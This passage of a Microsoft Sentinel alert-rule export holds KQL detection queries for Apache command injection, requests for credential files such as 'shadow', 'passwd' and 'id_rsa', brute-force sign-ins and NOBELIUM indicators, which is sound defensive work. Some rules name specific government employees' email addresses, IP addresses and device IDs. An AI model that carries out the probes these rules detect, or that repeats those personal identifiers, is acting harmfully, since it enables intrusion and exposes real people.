          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess"
          ],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5M",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": null,
              "groupByCustomDetails": null
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Malware",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "MalwareCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/9cf7cd56-70be-494e-85f0-ec06cd66cc0a')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/9cf7cd56-70be-494e-85f0-ec06cd66cc0a')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Apache - Command in URI",
          "description": "Detects command in URI",
          "severity": "Medium",
          "enabled": false,
          "query": "ApacheHTTPServer\n| where UrlOriginal contains \"whoami\" or UrlOriginal contains \"dpkg\" or UrlOriginal contains \"useradd\" or UrlOriginal contains \"sudo\"\n| extend UrlCustomEntity = UrlOriginal\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess"
          ],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5M",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": null,
              "groupByCustomDetails": null
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "URL",
              "fieldMappings": [
                {
                  "identifier": "Url",
                  "columnName": "UrlCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/2958071c-5d50-454a-8bd1-50d05c6548cc')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/2958071c-5d50-454a-8bd1-50d05c6548cc')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Apache - Private IP in URL",
          "description": "Detects requests to unusual URL",
          "severity": "Medium",
          "enabled": false,
          "query": "ApacheHTTPServer\n| where UrlOriginal matches regex @'(10\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3})|(172\\.1[6-9]\\.\\d{1,3}\\.\\d{1,3})|(172\\.2[0-9]\\.\\d{1,3}\\.\\d{1,3})|(172\\.3[0-1]\\.\\d{1,3}\\.\\d{1,3})|(192\\.168\\.\\d{1,3}\\.\\d{1,3})'\n| extend UrlCustomEntity = UrlOriginal\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess"
          ],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5M",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": null,
              "groupByCustomDetails": null
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "URL",
              "fieldMappings": [
                {
                  "identifier": "Url",
                  "columnName": "UrlCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/e708388a-7beb-4e51-879a-8161916cb4e2')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/e708388a-7beb-4e51-879a-8161916cb4e2')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Apache - Request to sensitive files",
          "description": "Detects request to sensitive files.",
          "severity": "Medium",
          "enabled": false,
          "query": "let forbidden_files = dynamic(['shadow', 'passwd', 'id_rsa']);\nApacheHTTPServer    \n| extend File = extract(@'(.*\\/)?(.*)', 2, tostring(UrlOriginal))\n| where File in (forbidden_files)\n| extend FileCustomEntity = File, UrlCustomEntity = UrlOriginal\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess"
          ],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5M",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": null,
              "groupByCustomDetails": null
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "File",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "FileCustomEntity"
                }
              ]
            },
            {
              "entityType": "URL",
              "fieldMappings": [
                {
                  "identifier": "Url",
                  "columnName": "UrlCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/8a8e9609-3d27-4358-b897-7725c94e461e')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/8a8e9609-3d27-4358-b897-7725c94e461e')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Apache - Put suspicious file",
          "description": "Detects PUT or POST of suspicious file",
          "severity": "Medium",
          "enabled": false,
          "query": "ApacheHTTPServer\n| where HttpRequestMethod in~ (\"POST\", \"PUT\") \n| extend File = extract(@\"(.*\\/)?(.*)\", 2, tostring(UrlOriginal))\n| where isnotempty(File)\n| where File matches regex @\"([a-zA-Z0-9-_]+\\.)([a-zA-Z0-9-]+\\.[a-zA-Z0-9-]+)\"\n| extend FileCustomEntity = File, UrlCustomEntity = UrlOriginal\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess",
            "Exfiltration"
          ],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5M",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": null,
              "groupByCustomDetails": null
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "File",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "FileCustomEntity"
                }
              ]
            },
            {
              "entityType": "URL",
              "fieldMappings": [
                {
                  "identifier": "Url",
                  "columnName": "UrlCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/f37697b4-fc48-480e-bbfa-f28391e87086')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/f37697b4-fc48-480e-bbfa-f28391e87086')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Apache - Multiple server errors from single IP",
          "description": "Detects multiple server errors from one source in short timeframe",
          "severity": "Medium",
          "enabled": false,
          "query": "let threashold = 100;\nApacheHTTPServer\n| where tolong(HttpStatusCode) >= 500 and tolong(HttpStatusCode) <= 599 \n| summarize MultipleServerErrors = count() by SrcIpAddr, bin(TimeGenerated, 5m)\n| where MultipleServerErrors > threashold\n| extend IPCustomEntity = SrcIpAddr\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Impact",
            "InitialAccess"
          ],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5M",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": null,
              "groupByCustomDetails": null
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/50338979-a926-45c2-bbd3-3c0baf70617c')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/50338979-a926-45c2-bbd3-3c0baf70617c')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Apache - Requests to rare files",
          "description": "Shows requests to rare files",
          "severity": "Medium",
          "enabled": false,
          "query": "let lb_period_start = 14d;\nlet lb_period_end = 1d;\nlet known_files = ApacheHTTPServer\n| where TimeGenerated between (ago(lb_period_start) .. ago(lb_period_end))\n| extend File = extract(@\"(.*\\/)?(.*)\", 2, tostring(UrlOriginal))\n| summarize makeset(File);\nApacheHTTPServer\n| where TimeGenerated > ago(24h)\n| extend File = extract(@\"(.*\\/)?(.*)\", 2, tostring(UrlOriginal))\n| where File in~ (known_files)\n| extend FileCustomEntity = File, UrlCustomEntity = UrlOriginal\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess"
          ],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5M",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": null,
              "groupByCustomDetails": null
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "File",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "FileCustomEntity"
                }
              ]
            },
            {
              "entityType": "URL",
              "fieldMappings": [
                {
                  "identifier": "Url",
                  "columnName": "UrlCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/f25f141d-a311-498f-9258-2238ff7a8be3')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/f25f141d-a311-498f-9258-2238ff7a8be3')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Potential Successful Brute Force Sign In/Compromised Account - joseph.lott@dcss.ca.gov",
          "description": "This query is designed to identify patterns or anomalies in sign-in activities, specifically targeting users who have been subjected to brute force attacks by unknown actors. By filtering and analyzing the SigninLogs based on specific (known) user principal names and IP addresses, the query helps to pinpoint successful access attempts that originate from atypical locations or IPs for the identified users. The goal is to identify potential unauthorized sign-ins.",
          "severity": "Medium",
          "enabled": false,
          "query": "SigninLogs\r\n| where UserPrincipalName contains \"joseph.lott@dcss.ca.gov\"//\"NAME\". This part of the query should be updated with a specific user principal name to narrow down the results.\r\n| where IPAddress !in (\"136.226.7.68\", \"73.116.212.58\", \"76.158.3.146\", \"169.2.108.102\", \"2601:204:e480:4820:2d8b:3741:f72a:676d, :2601:204:e480:4820:8c15:9feb:7d96:ac34\")// This filters the entries further to show only those originating from the specified IP addresses.\r\n| where DeviceDetail !has \"L123845\" //excluding managed device logins\r\n| where ResultType == \"0\"// \"0\", indicates successful sign-in attempts.\r\n| summarize FirstSeen = min(TimeGenerated), LastObserved = max(TimeGenerated), SuccessfullCount = count(ResultType = 0), FailureCount = count(ResultType != 0) by UserPrincipalName, IPAddress, Location, tostring(DeviceDetail.deviceId), UserAgent, ClientAppUsed, AppDisplayName, ResultType, ResultDescription, ConditionalAccessStatus, UserType, TimeGenerated, tostring(DeviceDetail), locationString = strcat(tostring(LocationDetails[\"countryOrRegion\"]), \"/\", strcat(tostring(LocationDetails[\"state\"]), \"/\", tostring(LocationDetails[\"city\"]), \";\"))",
          "queryFrequency": "PT2H",
          "queryPeriod": "PT2H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess",
            "Impact"
          ],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/dee2f5df-36f2-40a9-b688-01b40796218d')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/dee2f5df-36f2-40a9-b688-01b40796218d')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Potential Successful Brute Force Sign In /Compromised Account - michael.laughridge@dcss.ca.gov",
          "description": "This query is designed to identify patterns or anomalies in sign-in activities, specifically targeting users who have been subjected to brute force attacks by unknown actors. By filtering and analyzing the SigninLogs based on specific (known) user principal names and IP addresses, the query helps to pinpoint successful access attempts that originate from atypical locations or IPs for the identified users. The goal is to identify potential unauthorized sign-ins.",
          "severity": "Medium",
          "enabled": false,
          "query": "SigninLogs\r\n| where UserPrincipalName contains \"michael.laughridge@dcss.ca.gov\"//\"NAME\". This part of the query should be updated with a specific user principal name to narrow down the results.\r\n| where IPAddress !in (\"67.58.233.0\", \"156.47.83.225\",\"169.2.108.102\", \"136.226.6.172\")// This filters the entries further to show only those originating from the specified IP addresses.\r\n| where DeviceDetail !contains \"L127077\" // excludes managed device sign ins from this alert\r\n| where ResultType == \"0\"// \"0\", indicates successful sign-in attempts.\r\n| summarize FirstSeen = min(TimeGenerated), LastObserved = max(TimeGenerated), SuccessfullCount = count(ResultType = 0), FailureCount = count(ResultType != 0) by UserPrincipalName, IPAddress, Location, tostring(DeviceDetail.deviceId), UserAgent, ClientAppUsed, AppDisplayName, ResultType, ResultDescription, ConditionalAccessStatus, UserType, TimeGenerated, tostring(DeviceDetail), locationString = strcat(tostring(LocationDetails[\"countryOrRegion\"]), \"/\", strcat(tostring(LocationDetails[\"state\"]), \"/\", tostring(LocationDetails[\"city\"]), \";\"))",
          "queryFrequency": "PT2H",
          "queryPeriod": "PT2H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess",
            "Impact"
          ],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-004')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-004')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-004: [RBA] O365 - Activity for specific file or folder",
          "description": "This alert will trigger when an unusual activity will be seen on a specific Sharepoint folder specified by the customer. MITRE: T1213 Category: Microsoft Defender XDR tag: RBA",
          "severity": "Informational",
          "enabled": false,
          "query": "OfficeActivity\n| where TimeGenerated >= ago(1d)\n| where OfficeWorkload =~ 'SharePoint'\n| where OfficeObjectId matches regex MONITORED_SHAREPOINT_ACTIVITIES\n| summarize LastAccess=max(TimeGenerated), make_set(Operation, 5) by UserId, SourceFileName, IPAddress=ClientIP\n| extend AccountCustomEntity = UserId\n| extend IPCustomEntity = IPAddress",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Collection"
          ],
          "techniques": [
            "T1213"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/73a0ad39-f7d1-41fa-85fd-ba56aff7f57c')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/73a0ad39-f7d1-41fa-85fd-ba56aff7f57c')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "AUTO DISABLED NOBELIUM - Domain, Hash and IP IOCs - May 2021",
          "description": "The alert rule was disabled due to too many consecutive failures. Reason: The query referred to a storage path that was not found. Identifies a match across various data feeds for domains, hashes and IP IOCs related to NOBELIUM.\nRef: https://www.microsoft.com/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/",
          "severity": "Medium",
          "enabled": false,
          "query": "let iocs = externaldata(DateAdded:string,FirstSeen:string,IoC:string,Type:string,TLP:string)\n[@\"https://raw.githubusercontent.com/microsoft/mstic/master/Indicators/May21-NOBELIUM/May21NOBELIUMIoCs.csv\"] with (format=\"csv\", ignoreFirstRecord=True);\nlet sha256s = (iocs | where Type =~ \"SHA256\"| project IoC);\nlet ips = (iocs | where Type =~ \"IP\"| project IoC);\nlet IPList = dynamic([\"192.99.221.77\",\"83.171.237.173\"]);\nlet ips_list=toscalar(ips | summarize makeset(IoC));\nlet full_ip_list= array_concat(ips_list, IPList);\nlet domains = (iocs | where Type =~ \"Domain\"| project IoC);\nlet domain_list=toscalar(domains | summarize make_set(IoC));\nlet IPRegex = '[0-9]{1,3}\\\\.[0-9]{1,3}\\\\.[0-9]{1,3}\\\\.[0-9]{1,3}';\nlet sha256Hashes = dynamic([\"2523f94bd4fba4af76f4411fe61084a7e7d80dec163c9ccba9226c80b8b31252\",\n\"d035d394a82ae1e44b25e273f99eae8e2369da828d6b6fdb95076fd3eb5de142\",\n\"94786066a64c0eb260a28a2959fcd31d63d175ade8b05ae682d3f6f9b2a5a916\",\n\"48b5fb3fa3ea67c2bc0086c41ec755c39d748a7100d71b81f618e82bf1c479f0\",\n\"ee44c0692fd2ab2f01d17ca4b58ca6c7f79388cbc681f885bb17ec946514088c\",\n\"ee42ddacbd202008bcc1312e548e1d9ac670dd3d86c999606a3a01d464a2a330\"]);\n(union isfuzzy=true\n(CommonSecurityLog\n| where SourceIP in (IPList) or DestinationIP in (IPList) or DestinationHostName in~ (domains) or RequestURL has_any (domains) or Message has_any (IPList)\n| parse Message with * '(' DNSName ')' * \n| extend MessageIP = extract(IPRegex, 0, Message)\n| extend IPMatch = case(SourceIP in (IPList), \"SourceIP\", DestinationIP in (IPList), \"DestinationIP\", MessageIP in (IPList), \"Message\", RequestURL in (domains), \"RequestUrl\", SourceIP in (ips), \"SourceIP\", DestinationIP in (ips), \"DestinationIP\", MessageIP in (IPList), \"Message\", \"NoMatch\") \n| extend timestamp = TimeGenerated, IPCustomEntity = case(IPMatch == \"SourceIP\", SourceIP, IPMatch == \"DestinationIP\", DestinationIP, IPMatch == \"Message\", MessageIP, \"NoMatch\"), AccountCustomEntity = SourceUserID\n),\n(_Im_Dns (domain_has_any=todynamic(domain_list))\n| extend DestinationIPAddress = DnsResponseName, DNSName = DnsQuery, Host = Dvc\n| extend timestamp = TimeGenerated, IPCustomEntity = SrcIpAddr, HostCustomEntity = Host\n),\n(_Im_Dns (response_has_any_prefix=todynamic(full_ip_list))\n| extend DestinationIPAddress = DnsResponseName, DNSName = DnsQuery, Host = Dvc\n| extend timestamp = TimeGenerated, IPCustomEntity = SrcIpAddr, HostCustomEntity = Host\n),\n(VMConnection\n| where SourceIp in (IPList) or DestinationIp in (IPList) or SourceIp in (ips) or DestinationIp in (ips) or RemoteDnsCanonicalNames has_any (domains)\n| parse RemoteDnsCanonicalNames with * '[\"' DNSName '\"]' *\n| extend IPMatch = case( SourceIp in (IPList), \"SourceIP\", DestinationIp in (IPList), \"DestinationIP\",  SourceIp in (ips), \"SourceIP\", DestinationIp in (ips), \"DestinationIP\", \"None\") \n| extend timestamp = TimeGenerated, IPCustomEntity = case(IPMatch == \"SourceIP\", SourceIp, IPMatch == \"DestinationIP\", DestinationIp, \"NoMatch\"), HostCustomEntity = Computer\n),\n(OfficeActivity\n| where ClientIP in (IPList) or ClientIP in (ips)\n| extend timestamp = TimeGenerated, IPCustomEntity = ClientIP, AccountCustomEntity = UserId\n),\n(WindowsFirewall\n| where SourceIP in (IPList) or DestinationIP in (IPList) or SourceIP in (ips) or DestinationIP in (ips)\n| extend IPMatch = case( SourceIP in (IPList), \"SourceIP\", DestinationIP in (IPList), \"DestinationIP\", SourceIP in (ips), \"SourceIP\", DestinationIP in (ips), \"DestinationIP\", \"None\")\n),\n(_Im_NetworkSession(srcipaddr_has_any_prefix=full_ip_list)\n  | extend IPMatch =  \"SourceIP\"\n  | extend timestamp = TimeGenerated, HostCustomEntity = Dvc , IPCustomEntity = SrcIpAddr //, AccountCustomEntity =User\n),\n(_Im_NetworkSession(dstipaddr_has_any_prefix=full_ip_list)\n  | extend IPMatch =  \"DestinationIP\"\n  | extend timestamp = TimeGenerated, HostCustomEntity = Dvc , IPCustomEntity =  DstIpAddr //, AccountCustomEntity =User\n),\n(_Im_WebSession(url_has_any=domains)\n  | extend timestamp=TimeGenerated, HostCustomEntity=Dvc , DNSName=tostring(parse_url(Url)[\"Host\"]), AccountCustomEntity=User\n),\n(_Im_WebSession(srcipaddr_has_any_prefix=full_ip_list)\n  | extend timestamp=TimeGenerated, HostCustomEntity=Dvc , DNSName=tostring(parse_url(Url)[\"Host\"]), AccountCustomEntity=User\n),\n(AzureDiagnostics \n| where ResourceType == \"AZUREFIREWALLS\"\n| where Category == \"AzureFirewallApplicationRule\"\n| parse msg_s with Protocol 'request from ' SourceHost ':' SourcePort 'to ' DestinationHost ':' DestinationPort '. Action:' Action\n| where isnotempty(DestinationHost)\n| where DestinationHost has_any (domains)  \n| extend timestamp = TimeGenerated, DNSName = DestinationHost, IPCustomEntity = SourceHost\n),\n(Event\n//This query uses sysmon data depending on table name used this may need updating\n| where Source == \"Microsoft-Windows-Sysmon\"\n| extend EvData = parse_xml(EventData)\n| extend EventDetail = EvData.DataItem.EventData.Data\n| where EventDetail has_any (sha256Hashes) or EventDetail has_any (sha256s)\n| parse EventDetail with * 'SHA256=' SHA256 '\",' *\n| extend Type = strcat(Type, \": \", Source), Account = UserName, FileHash = SHA256\n| project Type, TimeGenerated, Computer, Account, FileHash\n),\n(DeviceFileEvents\n| where SHA256 in~ (sha256Hashes) or SHA256 in~ (sha256s)\n| extend Account = RequestAccountName, Computer = DeviceName, IPAddress = RequestSourceIP, CommandLine = InitiatingProcessCommandLine, FileHash = SHA256\n| project Type, TimeGenerated, Computer, Account, IPAddress, CommandLine, FileHash\n),\n(imFileEvent\n| where TargetFileSHA256 in~ (sha256Hashes) or TargetFileSHA256 in~ (sha256s)\n| extend Account = ActorUsername, Computer = DvcHostname, IPAddress = SrcIpAddr, CommandLine = ActingProcessCommandLine, FileHash = TargetFileSHA256\n| project Type, TimeGenerated, Computer, Account, IPAddress, CommandLine, FileHash\n),\n(CommonSecurityLog\n| where FileHash in (sha256Hashes) or FileHash in (sha256s)\n| extend timestamp = TimeGenerated\n)\n)",
          "queryFrequency": "PT6H",
          "queryPeriod": "PT6H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CommandAndControl",
            "Execution"
          ],
          "techniques": [
            "T1102",
            "T1204"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "677da133-e487-4108-a150-5b926591a92b",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "HostCustomEntity"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            },
            {
              "entityType": "DNS",
              "fieldMappings": [
                {
                  "identifier": "DomainName",
                  "columnName": "DNSName"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.5.1"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-634')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-634')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-634: [RBA] O365 - Email Forwarding Rule Set by User",
